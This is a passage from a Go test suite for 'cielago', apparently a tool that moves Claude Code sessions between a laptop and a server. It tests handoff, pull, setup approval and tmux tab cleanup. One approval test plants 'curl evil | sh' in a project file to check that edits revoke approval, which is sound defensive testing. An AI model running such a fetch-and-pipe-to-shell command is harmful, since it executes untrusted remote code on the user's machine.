  auth) echo '{"loggedIn":true,"authMethod":"claude.ai"}' ;;
  plugin) echo "cielago@cielago" ;;
esac
`

func (f *fixture) tool(name, body string) string {
	f.t.Helper()
	path := filepath.Join(f.home, "bin", name)
	f.write(filepath.Dir(path), name, body)
	if err := os.Chmod(path, 0o755); err != nil {
		f.t.Fatal(err)
	}
	return path
}

func (f *fixture) config(body string) {
	f.t.Helper()
	f.write(filepath.Join(f.home, ".config", "cielago"), "config.toml", body)
}

func TestArmNeedsAConfiguredHostAndTheClaudeProcess(t *testing.T) {
	f := newFixture(t)
	id := "0f0f0f0f-1111-2222-3333-555555555555"
	f.config("local_roots = [\"~/laptop\"]\n[hosts.server]\nssh = \"fakehost\"\nclaude = \"claude\"\nroots = [\"~/developer\"]\nlauncher = \"tmux\"\n")
	t.Setenv("CLAUDE_PID", "")
	if err := arm("server", id, "", io.Discard); err == nil || !strings.Contains(err.Error(), "CLAUDE_PID") {
		t.Errorf("arm outside Claude Code gave %v", err)
	}
	t.Setenv("CLAUDE_PID", "4242")
	if err := arm("nowhere", id, "", io.Discard); err == nil || !strings.Contains(err.Error(), "server") {
		t.Errorf("arm to an unknown host gave %v", err)
	}
	if err := arm("server", "not-an-id", "", io.Discard); err == nil {
		t.Error("arm accepted a malformed session id")
	}
	if err := arm("server", id, "dev server on :3000", io.Discard); err != nil {
		t.Fatal(err)
	}
	path, _ := armedPath(id)
	var a armed
	if err := json.Unmarshal([]byte(f.read(filepath.Dir(path), filepath.Base(path))), &a); err != nil || a.Host != "server" || a.PID != 4242 || a.Note != "dev server on :3000" {
		t.Errorf("armed = %+v, %v", a, err)
	}
}

func TestParentOfFindsThisProcesssParent(t *testing.T) {
	child := exec.Command("sleep", "5")
	if err := child.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { child.Process.Kill(); child.Wait() })
	if got, err := parentOf(child.Process.Pid); err != nil || got != os.Getpid() {
		t.Errorf("parentOf(child) = %d, %v; want %d", got, err, os.Getpid())
	}
}

func TestTheStopHookOnlyMovesASessionArmedFromItsOwnProcess(t *testing.T) {
	f := newFixture(t)
	id := "0f0f0f0f-1111-2222-3333-666666666666"
	input := `{"session_id":"` + id + `","transcript_path":"/nowhere.jsonl","cwd":"/nowhere"}`
	var out strings.Builder
	if err := stopHook(strings.NewReader(input), &out); err != nil || out.Len() != 0 {
		t.Fatalf("an unarmed session: output %q, err %v", out.String(), err)
	}
	path, _ := armedPath(id)
	f.write(filepath.Dir(path), filepath.Base(path), `{"host":"server","pid":1}`)
	if err := stopHook(strings.NewReader(input), &out); err != nil || out.Len() != 0 {
		t.Fatalf("a session armed by another process: output %q, err %v", out.String(), err)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Error("the armed file outlived the turn it was meant for")
	}
}

func (f *fixture) isolatedTmux() {
	f.t.Helper()
	if _, err := exec.LookPath("tmux"); err != nil {
		f.t.Skip("tmux isn't installed")
	}
	sockets, err := os.MkdirTemp("", "tm")
	if err != nil {
		f.t.Fatal(err)
	}
	f.t.Cleanup(func() { os.RemoveAll(sockets) })
	f.t.Setenv("TMUX_TMPDIR", sockets)
	f.t.Setenv("TMUX", "")
	f.t.Cleanup(func() { exec.Command("tmux", "kill-server").Run() })
}

func TestAFailedHandoffLeavesNoTabAndARetryPicksUpFromIt(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	claude := f.tool("claude", fakeClaudeThatStarts)
	f.messUp(f.local)
	id := "0f0f0f0f-1111-2222-3333-777777777777"
	slug, _ := projectSlug(f.local)
	transcript := filepath.Join(f.home, ".claude", "projects", slug, id+".jsonl")
	h := Handoff{
		HostName:       "server",
		Host:           Host{SSH: "fakehost", Claude: claude, Roots: []string{"~/developer"}, Secrets: []string{".env"}, Launcher: "tmux", LocalRoots: []string{"~/laptop"}},
		SessionID:      id,
		TranscriptPath: transcript,
		Cwd:            f.local,
	}
	_, err := h.Run()
	if err == nil || !strings.Contains(err.Error(), "transcript") || !strings.Contains(err.Error(), "trying again updates it") {
		t.Fatalf("err = %v, want a transcript failure that says a retry updates the copy", err)
	}
	if windows, _ := exec.Command("tmux", "list-windows", "-a").Output(); len(windows) > 0 {
		t.Errorf("a failed handoff left tmux windows: %s", windows)
	}
	f.write(filepath.Dir(transcript), id+".jsonl", `{"cwd":"`+f.local+`"}`+"\n")
	f.write(f.local, "kept.txt", "edited while the session kept running here")
	if _, err := h.Run(); err != nil {
		t.Fatalf("the retry failed: %v", err)
	}
	if got := f.read(f.remote, "kept.txt"); got != "edited while the session kept running here" {
		t.Errorf("kept.txt on the server = %q", got)
	}
}

func TestPullBringsTheSessionAndItsWorkBackFromTheServer(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	out := f.workspace(f.local)
	if err := f.push(f.remoteHost(), out, Placement{Root: f.remote}); err != nil {
		t.Fatal(err)
	}
	if err := park(f.machine(), out.Root, out); err != nil {
		t.Fatal(err)
	}
	f.write(f.remote, "edited.txt", "finished on the server")
	id := "0f0f0f0f-1111-2222-3333-888888888888"
	slug, _ := projectSlug(f.remote)
	transcript := filepath.Join(f.home, ".claude", "projects", slug, id+".jsonl")
	f.write(filepath.Dir(transcript), id+".jsonl", `{"cwd":"`+f.remote+`"}`+"\n")

	res, err := Pull{HostName: "server", Host: Host{SSH: "fakehost", Roots: []string{"~/developer"}, LocalRoots: []string{"~/laptop"}, Secrets: []string{".env"}}, SessionID: id, Out: io.Discard}.Run()
	if err != nil {
		t.Fatalf("pull failed after %s: %v", res.Summary(), err)
	}
	if res.ToDir != f.local || res.Session != id || !strings.Contains(handoffPrompt(res.PromptInfo), "handed off from server") {
		t.Errorf("pulled = %+v", res)
	}
	if got, want := f.git(f.local, "status", "--porcelain"), f.git(f.remote, "status", "--porcelain"); got != want {
		t.Errorf("laptop status:\n%s\nwant:\n%s", got, want)
	}
	if got := f.read(f.local, "edited.txt"); got != "finished on the server" {
		t.Errorf("edited.txt on the laptop = %q", got)
	}
	localSlug, _ := projectSlug(f.local)
	if got := f.read(filepath.Join(f.home, ".claude", "projects", localSlug), id+".jsonl"); !strings.Contains(got, f.remote) {
		t.Errorf("transcript on the laptop = %q", got)
	}
	if got := f.read(filepath.Dir(transcript), id+".jsonl.handed-off-to-"+f.machine().Name()); got == "<missing>" {
		t.Error("the server's transcript wasn't retired")
	}
	if ref := f.git(f.remote, "rev-parse", "-q", "--verify", parkedRef); ref == "" {
		t.Error("the server checkout wasn't marked as handed off")
	}
}

func TestInitWritesTheConfigAndKeepsAnswersWhenRunAgain(t *testing.T) {
	f := newFixture(t)
	f.tool("rex", "#!/bin/sh\nexit 1\n")
	f.tool("tailscale", "#!/bin/sh\nexit 1\n")
	claude := f.tool("claude", fakeClaudeCLI)
	answers := strings.Join([]string{"~/laptop", "", "server", "fakehost", claude, "~/developer", "", "tmux", "claude rc --name {repo}"}, "\n") + "\n"
	initConfig(strings.NewReader(answers), io.Discard)
	h, err := loadHost("server")
	if err != nil {
		t.Fatal(err)
	}
	if h.SSH != "fakehost" || h.Claude != claude || strings.Join(h.Roots, ",") != "~/developer" || h.Launcher != "tmux" || h.NewTabCommand != "claude rc --name {repo}" || strings.Join(h.Secrets, ",") != ".env,.env.*" || !slices.Contains(h.Exclude, "node_modules") {
		t.Fatalf("host = %+v", h)
	}
	initConfig(strings.NewReader("server\n"+strings.Repeat("\n", 6)), io.Discard)
	again, err := loadHost("server")
	if err != nil {
		t.Fatal(err)
	}
	if again.NewTabCommand != h.NewTabCommand || again.Claude != h.Claude || strings.Join(again.Roots, ",") != "~/developer" {
		t.Errorf("running init again and pressing Enter changed the host: %+v", again)
	}
}

func TestDoctorChecksTheServer(t *testing.T) {
	f := newFixture(t)
	claude := f.tool("claude", fakeClaudeCLI)
	var out strings.Builder
	c := &checks{out: &out}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	doctorHost(ctx, c, "server", Host{SSH: "fakehost", Claude: claude, Roots: []string{"~/developer", "~/missing"}, Launcher: "tmux"})
	report := out.String()
	for _, want := range []string{"✓ ssh fakehost works", "✓ git 2.", "✓ Claude Code 2.1.325 on server", "✓ logged in to claude.ai on server", "✓ root ~/developer exists", "✗ root ~/missing exists"} {
		if !strings.Contains(report, want) {
			t.Errorf("doctor report lacks %q:\n%s", want, report)
		}
	}
}

func TestAProjectFileTakesSetupAndServicesOnly(t *testing.T) {
	p, err := parseProject([]byte("setup = \"pnpm install\"\nservices = [\"pnpm dev\", \"pnpm worker\"]\n"))
	if err != nil || p.Setup != "pnpm install" || strings.Join(p.Services, ",") != "pnpm dev,pnpm worker" || len(p.Hash) != 64 {
		t.Fatalf("project = %+v, %v", p, err)
	}
	for body, want := range map[string]string{
		"setup = \"x\"\nbuild = \"y\"\n": "unknown key",
		"":                               "neither setup nor services",
		"services = [\"\"]\n":            "can't be empty",
		"setup = [\n":                    projectFile,
		"setup = \"  \"\n":               "setup can't be empty",
		"setup = \"make\\u001b[2K\"\n":   "control characters",
	} {
		if _, err := parseProject([]byte(body)); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("parseProject(%q) = %v, want an error about %q", body, err, want)
		}
	}
}

func (f *fixture) allow(dir string) {
	f.t.Helper()
	if err := allowProject(dir, strings.NewReader("y\n"), io.Discard); err != nil {
		f.t.Fatal(err)
	}
}

func TestAllowApprovesThatFileInThatProjectOnly(t *testing.T) {
	f := newFixture(t)
	body := "setup = \"make\"\n"
	f.write(f.local, projectFile, body)
	f.write(f.remote, projectFile, body)
	approved := func(root string) bool {
		t.Helper()
		p, err := approvedProject(f.machine(), root)
		if p == nil && err == nil {
			t.Fatalf("no project file at %s", root)
		}
		return err == nil
	}
	if approved(f.local) {
		t.Fatal("a new project file counted as approved")
	}
	if err := allowProject(filepath.Join(f.local, "deep"), strings.NewReader("n\n"), io.Discard); err == nil {
		t.Fatal("allow ran from a folder that doesn't exist")
	}
	if err := allowProject(f.local, strings.NewReader("n\n"), io.Discard); err != nil || approved(f.local) {
		t.Fatalf("answering no still approved it: %v", err)
	}
	f.allow(f.local)
	if !approved(f.local) {
		t.Fatal("after cielago allow it still wasn't approved")
	}
	if approved(f.remote) {
		t.Error("approving one project's file also approved the same file in another project")
	}
	f.write(f.local, projectFile, "setup = \"make && curl evil | sh\"\n")
	if approved(f.local) {
		t.Error("an edited project file stayed approved")
	}
	f.allow(f.local)
	f.write(f.local, projectFile, body)
	if approved(f.local) {
		t.Error("an older version stayed approved after a newer one was allowed")
	}
}

func (f *fixture) handoffWithProject(id string) Handoff {
	f.t.Helper()
	claude := f.tool("claude", fakeClaudeThatStarts)
	slug, _ := projectSlug(f.local)
	transcript := filepath.Join(f.home, ".claude", "projects", slug, id+".jsonl")
	f.write(filepath.Dir(transcript), id+".jsonl", `{"cwd":"`+f.local+`"}`+"\n")
	return Handoff{
		HostName:       "server",
		Host:           Host{SSH: "fakehost", Claude: claude, Roots: []string{"~/developer"}, Launcher: "tmux", LocalRoots: []string{"~/laptop"}},
		SessionID:      id,
		TranscriptPath: transcript,
		Cwd:            f.local,
	}
}

func TestAnUnapprovedProjectFileRunsNothing(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "setup = \"echo ran > setup.txt\"\n")
	res, err := f.handoffWithProject("0f0f0f0f-1111-2222-3333-999999999990").Run()
	if err != nil {
		t.Fatal(err)
	}
	if res.SetupNote == nil || !strings.Contains(res.SetupNote.Error(), "cielago allow") {
		t.Errorf("setup note = %v", res.SetupNote)
	}
	if waitForFile(t, filepath.Join(f.remote, "setup.txt"), 2*time.Second) {
		t.Error("an unapproved setup ran")
	}
}

func TestServicesStartOnlyAfterSetupSucceeds(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "setup = \"sleep 1 && echo ready > setup.txt\"\nservices = [\"cat setup.txt > served.tmp && mv served.tmp served.txt\"]\n")
	f.allow(f.local)
	id := "0f0f0f0f-1111-2222-3333-999999999991"
	if res, err := f.handoffWithProject(id).Run(); err != nil || res.SetupNote != nil {
		t.Fatalf("handoff: %v, setup note %v", err, res.SetupNote)
	}
	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
		t.Fatal("the service never started")
	}
	if got := strings.TrimSpace(f.read(f.remote, "served.txt")); got != "ready" {
		t.Errorf("the service started before setup finished: served.txt = %q", got)
	}
	if got := strings.TrimSpace(f.read(filepath.Join(f.home, ".cielago", "setup"), id)); got != "ok" {
		t.Errorf("setup status = %q", got)
	}
	panes, _ := exec.Command("tmux", "list-panes", "-a", "-F", "#{window_name}").Output()
	if got := strings.Count(string(panes), "api · claude"); got != 3 {
		t.Errorf("the Claude tab has %d panes, want Claude, setup and the service:\n%s", got, panes)
	}
}

func TestAFailedSetupKeepsServicesFromStarting(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "setup = \"exit 3\"\nservices = [\"echo up > served.txt\"]\n")
	f.allow(f.local)
	id := "0f0f0f0f-1111-2222-3333-999999999992"
	if _, err := f.handoffWithProject(id).Run(); err != nil {
		t.Fatal(err)
	}
	status := filepath.Join(f.home, ".cielago", "setup", id)
	deadline := time.Now().Add(10 * time.Second)
	for f.read(filepath.Dir(status), id) == "" && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
	}
	if got := strings.TrimSpace(f.read(filepath.Dir(status), id)); got != "failed" {
		t.Fatalf("setup status = %q", got)
	}
	if waitForFile(t, filepath.Join(f.remote, "served.txt"), 2*time.Second) {
		t.Error("a service started although setup failed")
	}
}

func TestServicesWithoutSetupStartRightAway(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "services = [\"echo up > served.txt\"]\n")
	f.allow(f.local)
	if _, err := f.handoffWithProject("0f0f0f0f-1111-2222-3333-999999999993").Run(); err != nil {
		t.Fatal(err)
	}
	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
		t.Error("the service never started")
	}
}

func TestPullingASessionBackClosesItsTabOnTheServer(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	id := "0f0f0f0f-1111-2222-3333-999999999994"
	if _, err := f.handoffWithProject(id).Run(); err != nil {
		t.Fatal(err)
	}
	if windows, _ := exec.Command("tmux", "list-windows", "-a").Output(); len(windows) == 0 {
		t.Fatal("the handoff opened no tab")
	}
	if err := closeRecordedTab(f.remoteHost(), Host{Launcher: "tmux"}, id); err != nil {
		t.Fatal(err)
	}
	if windows, _ := exec.Command("tmux", "list-windows", "-a").Output(); len(windows) > 0 {
		t.Errorf("the session's tab outlived it: %s", windows)
	}
	if err := closeRecordedTab(f.remoteHost(), Host{Launcher: "tmux"}, id); err != nil {
		t.Errorf("closing an already closed tab: %v", err)
	}
}

func TestRetireClosesTheTabARecordedHandoffOpened(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	out, err := exec.Command("tmux", "new-session", "-d", "-P", "-F", "#{session_id} #{window_id}", "sleep", "60").Output()
	if err != nil {
		t.Fatal(err)
	}
	ids := strings.Fields(string(out))
	id := "0f0f0f0f-1111-2222-3333-999999999995"
	f.write(filepath.Join(f.home, ".cielago", "tabs"), id, "tmux\n"+ids[0]+"\n"+ids[1]+"\n")
	transcript := filepath.Join(f.home, "s.jsonl")
	f.write(f.home, "s.jsonl", "{}")
	claude := startFakeClaude(t, "60")
	if err := retire(armed{Host: "laptop", PID: claude.Process.Pid}, id, transcript); err != nil {
		t.Fatal(err)
	}
	if !waitForFile(t, transcript+".handed-off-to-laptop", 5*time.Second) {
		t.Fatal("the transcript wasn't retired")
	}
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if windows, _ := exec.Command("tmux", "list-windows", "-a").Output(); len(windows) == 0 {
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Error("retiring the session left its recorded tab open")
}

func TestPullRunsTheSetupHereAndTellsClaude(t *testing.T) {
	f := newFixture(t)
	dir := filepath.Join(f.home, "proj")
	f.write(dir, "x", "")
	note := setUpPulledProject(&Project{Setup: "echo here > setup.txt", Services: []string{"pnpm dev"}}, dir, io.Discard)
	if got := strings.TrimSpace(f.read(dir, "setup.txt")); got != "here" {
		t.Errorf("setup.txt = %q", got)
	}
	if !strings.Contains(note, "ran here") || !strings.Contains(note, "pnpm dev") {
		t.Errorf("note = %q", note)
	}
	if note := setUpPulledProject(&Project{Setup: "exit 4"}, dir, io.Discard); !strings.Contains(note, "failed here") {
		t.Errorf("a failed setup gave note %q", note)
	}
}

func TestRexSplitsBesideTheGivenPaneWithoutTakingFocus(t *testing.T) {
	f := newFixture(t)
	f.tool("rex", "#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$HOME/rex-args\"\necho '{\"block_ids\":[\"block:new\"]}'\n")
	id, err := Rex{server: "server", remote: f.remoteHost()}.Split(Tab{Session: "session:s"}, "block:claude", true, "pnpm dev", "/srv/api", []string{"sh", "-c", "x"})
	if err != nil || id != "block:new" {
		t.Fatalf("split = %q, %v", id, err)
	}
	args := strings.Fields(f.read(f.home, "rex-args"))
	want := "-S server split -s session:s -b block:claude --focus=false --label pnpm dev -c /srv/api --json --split below --ratio 35 -- sh -c x"
	if got := strings.Join(args, " "); got != want {
		t.Errorf("rex %s\nwant rex %s", got, want)
	}
}
